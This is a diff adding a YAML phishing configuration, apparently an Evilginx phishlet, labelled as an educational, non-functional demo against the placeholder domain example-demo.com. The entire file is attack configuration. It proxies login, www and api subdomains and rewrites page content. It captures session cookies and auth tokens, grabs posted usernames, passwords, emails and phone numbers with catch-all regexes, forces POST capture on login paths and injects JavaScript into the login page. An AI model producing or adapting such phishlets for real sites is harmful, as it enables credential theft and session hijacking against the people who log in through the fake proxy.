@@ -1,0 +1,51 @@
+# Demo Generic Phishlet - Educational Example
+# This is a non-functional example for learning purposes
+# DO NOT use against real services without authorization
+
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'example-demo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'example-demo.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'example-demo.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'example-demo.com', orig_sub: 'login', domain: 'example-demo.com', search: 'Example Demo', replace: 'Demo Service', mimes: ['text/html']}
+  - {triggers_on: 'example-demo.com', orig_sub: 'www', domain: 'example-demo.com', search: 'example-demo\.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.example-demo.com'
+    keys: ['session_token', 'auth_cookie', 'csrf_token']
+  - domain: 'login.example-demo.com'
+    keys: ['login_session', 'remember_token']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - {key: 'email', search: '(.*)', type: 'post'}
+    - {key: 'phone', search: '(.*)', type: 'post'}
+
+login:
+  domain: 'login.example-demo.com'
+  path: '/login'
+
+# Optional: Define auth URLs that trigger token capture
+auth_urls:
+  - '/api/auth/login'
+  - '/auth/callback'
+  - '/login/verify'
+
+# Optional: Force POST data capture
+force_post:
+  - {path: '/api/auth/login', search: 'username=(.*)', key_s: 'username', key_r: 'user'}
+  - {path: '/login', search: 'password=(.*)', key_s: 'password', key_r: 'pass'}
+
+# Optional: JavaScript injection
+js_inject:
+  - {trigger_domain: 'login.example-demo.com', trigger_path: '/login', trigger_params: ['username'], inject_js: 'alert("Demo phishlet loaded");'} 
